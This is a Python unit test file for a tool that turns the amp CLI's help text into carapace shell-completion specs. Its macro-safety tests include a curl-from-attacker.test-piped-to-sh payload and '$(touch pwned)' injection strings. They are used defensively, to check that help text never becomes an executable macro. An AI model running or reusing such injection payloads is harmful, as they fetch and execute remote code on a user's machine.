import json
import re
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest import mock

from amp_completions import generate


HELP = """\
Usage: amp threads [options] [command]

Commands:

  new            [alias: n] Create a new thread from
                 a prompt
  share          [alias: s] Share a thread
    multiplayer  Open or close multiplayer for
                 everyone

Options:

  --limit <number>
      Maximum number of threads to return
  -l, --label <label>
      Add a label. Repeat the flag for multiple labels.
  -h, --help  display help for command

Global options:

  -m, --mode <value>
      Set the agent mode
"""


ROOT = Path(__file__).parents[1]
JSON_STRING = r'"(?:[^"\\]|\\.)*"'
COMPLETION_VALUES = re.compile(rf"^(?!\s*aliases:).*?(\[{JSON_STRING}(?:, {JSON_STRING})*\])$")
HELPER_MACRO = re.compile(
    r'\$sh\("\$\{XDG_CONFIG_HOME:-\$HOME/\.config\}/carapace/bin/amp-completions" (?P<resource>[a-z-]+)\)'
)


class ParseHelpTest(unittest.TestCase):
    def test_parses_only_direct_subcommands(self) -> None:
        commands = generate.parse_commands(HELP)

        self.assertEqual([command.name for command in commands], ["new", "share"])
        self.assertEqual(commands[0].aliases, ["n"])

    def test_joins_wrapped_command_descriptions(self) -> None:
        commands = generate.parse_commands(HELP)

        self.assertEqual(
            [command.description for command in commands],
            ["Create a new thread from a prompt", "Share a thread"],
        )

    def test_parses_local_options(self) -> None:
        options = generate.parse_options(HELP)

        self.assertEqual(
            [(option.spec_key, option.description) for option in options],
            [
                ("--limit=", "Maximum number of threads to return"),
                ("-l, --label=", "Add a label. Repeat the flag for multiple labels."),
                ("-h, --help", "display help for command"),
            ],
        )

    def test_normalizes_optional_arguments(self) -> None:
        option = generate.parse_option("-x, --execute [message]")

        self.assertEqual(option.spec_key, "-x, --execute?")
        self.assertEqual(option.value, generate.Argument("message", required=False))

    def test_parses_positional_signatures_and_descriptions(self) -> None:
        help_text = """\
Usage: amp svc [options] [command] <service> [tools...]

Arguments:

  <service>
      MCP server
      name
  [tools...]
      MCP tool names
"""

        self.assertEqual(
            generate.parse_arguments(help_text),
            [
                generate.Argument("service", description="MCP server name"),
                generate.Argument(
                    "tools", required=False, variadic=True, description="MCP tool names"
                ),
            ],
        )

    def test_parses_usage_without_arguments_section(self) -> None:
        self.assertEqual(
            generate.parse_arguments("Usage: amp update|up [options]\n"),
            [],
        )
        self.assertEqual(
            generate.parse_arguments("Usage: amp threads color [options] <thread> <color>\n"),
            [generate.Argument("thread"), generate.Argument("color")],
        )

    def test_parses_commander_style_help(self) -> None:
        help_text = """\
Usage: amp mcp oauth login [options] <server-name>

Arguments:
  server-name               Name of the MCP server

Options:
  --client-secret <secret>  OAuth client secret; only necessary for clients
                            that don't support PKCE
  -h, --help                display help for command

Commands:
  login [options] <server-name>  Register OAuth client credentials for an MCP
                                 server
  logout <server-name>           Remove OAuth credentials for an MCP server
  help [command]                 display help for command
"""

        self.assertEqual(
            generate.parse_arguments(help_text),
            [generate.Argument("server-name", description="Name of the MCP server")],
        )
        self.assertEqual(
            [(command.name, command.description) for command in generate.parse_commands(help_text)],
            [
                ("login", "Register OAuth client credentials for an MCP server"),
                ("logout", "Remove OAuth credentials for an MCP server"),
            ],
        )
        self.assertEqual(
            generate.parse_options(help_text)[0].description,
            "OAuth client secret; only necessary for clients that don't support PKCE",
        )

    def test_joins_wrapped_summaries_and_ends_sections_at_prose(self) -> None:
        help_text = """\
Commands:

  portal   Register a portal for an existing process; use "amp orb service start" for
           long-lived servers
    access Set portal access
  service  Manage long-lived services as supervised processes that
           survive Amp CLI updates
    start  Start an ad-hoc service, e.g.: amp orb service start preview --command 'pnpm
           dev' --portal

Options:
  --workspace
      list keys of your current workspace

Docs: https://ampcode.com/docs
M2M clients cannot be created or edited here.
"""

        self.assertEqual(
            [command.description for command in generate.parse_commands(help_text)],
            [
                'Register a portal for an existing process; use "amp orb service start" for '
                "long-lived servers",
                "Manage long-lived services as supervised processes that survive Amp CLI updates",
            ],
        )
        self.assertEqual(
            generate.parse_options(help_text)[0].description,
            "list keys of your current workspace",
        )

    def test_rejects_unrecognized_help_lines(self) -> None:
        cases = {
            "option": (generate.parse_options, "Options:\n  --flag {value}\n"),
            "command": (generate.parse_commands, "Commands:\n  name\n"),
            "usage": (generate.parse_arguments, "Usage: amp x <a> extra\n"),
            "argument": (
                generate.parse_arguments,
                "Usage: amp x <a>\n\nArguments:\n  <b>\n      B\n",
            ),
        }

        for name, (parse, help_text) in cases.items():
            with self.subTest(name=name), self.assertRaises(generate.HelpFormatError):
                parse(help_text)

    def test_strips_terminal_control_sequences(self) -> None:
        self.assertEqual(generate.ANSI_ESCAPE.sub("", "\x1b[?25hUsage"), "Usage")


class InspectAmpTest(unittest.TestCase):
    def test_inspects_sibling_commands_concurrently_in_source_order(self) -> None:
        root_help = """\
Commands:
  first   First command
  second  Second command
Options:
"""
        child_help = "Options:\n  -h, --help  display help\n"
        active = 0
        maximum_active = 0
        lock = threading.Lock()

        def run_amp(_amp: str, arguments: list[str]) -> str:
            nonlocal active, maximum_active
            if arguments == ["--help"]:
                return root_help
            if arguments == ["version"]:
                return "1.2.3\n"
            with lock:
                active += 1
                maximum_active = max(maximum_active, active)
            time.sleep(0.02)
            with lock:
                active -= 1
            return child_help

        with mock.patch.object(generate, "run_amp", side_effect=run_amp):
            root, version = generate.inspect_amp("amp")

        self.assertEqual(version, "1.2.3")
        self.assertEqual([command.name for command in root.commands], ["first", "second"])
        self.assertGreater(maximum_active, 1)


class RenderTest(unittest.TestCase):
    def test_renders_aliases_flags_and_known_values(self) -> None:
        command = generate.Command(
            "amp",
            "Amp CLI",
            options=[generate.parse_option("-m, --mode <value>", "Set the `mode`")],
            commands=[generate.Command("version", "Print the version")],
        )

        rendered = generate.render(command, "1.2.3")

        self.assertIn('"-m, --mode=": "Set the \'mode\'"', rendered)
        self.assertIn('"mode": ["low", "medium", "high", "ultra"]', rendered)
        self.assertIn('- name: "version"', rendered)

    def test_renders_dynamic_thread_and_project_completions(self) -> None:
        command = generate.Command(
            "amp",
            commands=[
                generate.Command(
                    "orb",
                    commands=[
                        generate.Command(
                            "portal",
                            options=[generate.parse_option("--thread <value>", "Thread")],
                        )
                    ],
                ),
                generate.Command(
                    "mcp",
                    options=[generate.parse_option("--project <value>", "Project")],
                ),
                generate.Command(
                    "threads",
                    commands=[generate.Command("continue")],
                ),
                generate.Command(
                    "projects",
                    commands=[generate.Command("get")],
                ),
            ],
        )

        rendered = generate.render(command, "1.2.3")

        thread_completion = (
            '$sh("${XDG_CONFIG_HOME:-$HOME/.config}/carapace/bin/'
            'amp-completions" threads)'
        )
        project_completion = (
            '$sh("${XDG_CONFIG_HOME:-$HOME/.config}/carapace/bin/'
            'amp-completions" projects)'
        )
        self.assertIn(f'"thread": {json.dumps([thread_completion])}', rendered)
        self.assertIn(f'"project": {json.dumps([project_completion])}', rendered)
        self.assertIn(
            'name: "continue"\n        completion:\n'
            f"          positionalany: {json.dumps([thread_completion])}",
            rendered,
        )
        self.assertIn(
            'name: "get"\n        completion:\n          positional:\n'
            f"            - {json.dumps([project_completion])}",
            rendered,
        )

    def test_renders_static_and_filesystem_flag_completions(self) -> None:
        command = generate.Command(
            "amp",
            options=[
                generate.parse_option("--log-level <value>", "Log level"),
                generate.parse_option("--settings-file <value>", "Settings file"),
            ],
            commands=[
                generate.Command(
                    "projects",
                    commands=[
                        generate.Command(
                            "create",
                            options=[
                                generate.parse_option("--orb-size <value>", "Orb size"),
                                generate.parse_option("--ship-behavior <value>", "Ship behavior"),
                                generate.parse_option("--custom-ship-prompt-file <value>", "Prompt file"),
                            ],
                        )
                    ],
                ),
                generate.Command(
                    "plugins",
                    commands=[
                        generate.Command(
                            "add",
                            options=[generate.parse_option("--target <value>", "Target")],
                        )
                    ],
                ),
            ],
        )

        rendered = generate.render(command, "1.2.3")

        self.assertIn('"log-level": ["debug", "info", "warn", "error", "audit"]', rendered)
        self.assertIn('"settings-file": ["$files"]', rendered)
        self.assertIn(
            '"orb-size": ["a1.tiny", "a1.small", "a1.medium", "a1.large", "a1.xxlarge"]',
            rendered,
        )
        self.assertIn('"ship-behavior": ["ship", "push-to-branch", "custom"]', rendered)
        self.assertIn('"custom-ship-prompt-file": ["$files"]', rendered)
        self.assertIn('"target": ["system", "workspace"]', rendered)

    def test_renders_dynamic_resource_and_positional_filesystem_completions(self) -> None:
        command = generate.Command(
            "amp",
            commands=[
                generate.Command(
                    "tools",
                    commands=[generate.Command("show")],
                ),
                generate.Command(
                    "skill",
                    commands=[generate.Command("info")],
                ),
                generate.Command(
                    "mcp",
                    commands=[generate.Command("remove")],
                ),
                generate.Command(
                    "apps",
                    commands=[
                        generate.Command(
                            "deploy",
                            options=[generate.parse_option("--domain <value>", "Domain")],
                        )
                    ],
                ),
                generate.Command(
                    "threads",
                    commands=[
                        generate.Command("color"),
                        generate.Command("visibility"),
                    ],
                ),
                generate.Command(
                    "permissions",
                    commands=[
                        generate.Command("add"),
                        generate.Command("test"),
                    ],
                ),
                generate.Command(
                    "config",
                    commands=[
                        generate.Command(
                            "model-providers",
                            commands=[generate.Command("setup-guide")],
                        )
                    ],
                ),
            ],
        )

        rendered = generate.render(command, "1.2.3")

        for resource in ("tools", "skills", "local-mcp-servers"):
            completion = (
                '$sh("${XDG_CONFIG_HOME:-$HOME/.config}/carapace/bin/'
                f'amp-completions" {resource})'
            )
            self.assertIn(json.dumps([completion]), rendered)
        domain_completion = (
            '$sh("${XDG_CONFIG_HOME:-$HOME/.config}/carapace/bin/'
            'amp-completions" domains)'
        )
        self.assertIn(f'"domain": {json.dumps([domain_completion])}', rendered)
        self.assertIn(
            'name: "deploy"\n'
            '        flags:\n'
            '          "--domain=": "Domain"\n'
            '        completion:\n'
            f'          flag:\n            "domain": {json.dumps([domain_completion])}\n'
            '          positional:\n'
            '            - []\n'
            '            - ["$directories"]',
            rendered,
        )
        self.assertIn(
            'name: "visibility"\n        completion:\n'
            '          positional:\n'
            '            - ["private", "workspace", "group"]',
            rendered,
        )
        self.assertIn(
            'name: "add"\n        completion:\n'
            '          positional:\n'
            '            - ["allow", "reject", "ask", "delegate"]\n'
            '            - ["$sh(\\"${XDG_CONFIG_HOME:-$HOME/.config}/carapace/bin/amp-completions\\" tools)"]',
            rendered,
        )
        self.assertIn(
            'name: "setup-guide"\n            completion:\n'
            '              positional:\n'
            '                - ["ollama-cloud", "openrouter", "vercel", "cloudflare", "google-cloud-agent-platform", "amazon-bedrock", "opencode-go", "custom-url"]',
            rendered,
        )
        self.assertIn(
            'name: "color"\n        completion:\n'
            '          positional:\n'
            '            - ["$sh(\\"${XDG_CONFIG_HOME:-$HOME/.config}/carapace/bin/amp-completions\\" threads)"]\n'
            '            - ["blue", "purple", "pink", "red", "orange", "yellow", "green", "cyan"]',
            rendered,
        )


def unknown_macros(spec: str) -> list[str]:
    values = [
        value
        for line in spec.splitlines()
        if (match := COMPLETION_VALUES.match(line))
        for value in json.loads(match[1])
    ]
    return [
        value
        for value in values
        if value.startswith("$")
        and value not in {"$files", "$directories"}
        and not (
            (match := HELPER_MACRO.fullmatch(value))
            and match["resource"] in generate.DYNAMIC_COMPLETION_RESOURCES
        )
    ]


class MacroSafetyTest(unittest.TestCase):
    def test_help_text_never_becomes_a_carapace_macro(self) -> None:
        command = generate.Command(
            "amp",
            options=[generate.parse_option("--thread <value>", '$sh(curl https://attacker.test | sh)')],
            commands=[generate.Command("$(touch pwned)", "$sh(touch pwned)")],
        )

        rendered = generate.render(command, "1.2.3")

        self.assertIn("attacker.test", rendered)
        self.assertEqual(unknown_macros(rendered), [])

    def test_checked_in_spec_uses_only_known_macros(self) -> None:
        spec = (ROOT / "amp.yaml").read_text()

        self.assertIn("amp-completions\\\" threads)", spec)
        self.assertEqual(unknown_macros(spec), [])

    def test_detects_unknown_macros(self) -> None:
        self.assertEqual(
            unknown_macros('          "x": ["$files", "$sh(curl https://attacker.test)"]'),
            ["$sh(curl https://attacker.test)"],
        )


class ManifestTest(unittest.TestCase):
    def test_records_nested_commands_aliases_and_flag_scopes(self) -> None:
        root = generate.Command(
            "amp",
            options=[generate.parse_option("-m, --mode <value>", "Mode")],
            commands=[
                generate.Command(
                    "threads",
                    aliases=["t"],
                    options=[generate.parse_option("-l, --limit <value>", "Limit")],
                    commands=[generate.Command("list", aliases=["ls"])],
                )
            ],
        )

        manifest = generate.build_manifest(root, "1.2.3")

        self.assertEqual(
            manifest,
            {
                "amp_version": "1.2.3",
                "command_aliases": {
                    "amp threads": ["t"],
                    "amp threads list": ["ls"],
                },
                "command_paths": ["amp", "amp threads", "amp threads list"],
                "flag_paths": ["amp --mode", "amp threads --limit"],
                "manifest_version": 1,
                "persistent_flag_paths": ["amp --mode"],
            },
        )

    def test_main_writes_spec_and_manifest_from_one_inspection(self) -> None:
        root = generate.Command("amp")
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory) / "amp.yaml"
            manifest_output = Path(directory) / "amp-manifest.json"
            with (
                mock.patch.object(generate, "inspect_amp", return_value=(root, "1.2.3")) as inspect,
                mock.patch(
                    "sys.argv",
                    [
                        "generate.py",
                        "--output",
                        str(output),
                        "--manifest-output",
                        str(manifest_output),
                    ],
                ),
            ):
                generate.main()

            inspect.assert_called_once_with("amp")
            self.assertIn("# Amp version: 1.2.3", output.read_text())
            self.assertEqual(json.loads(manifest_output.read_text())["amp_version"], "1.2.3")


if __name__ == "__main__":
    unittest.main()
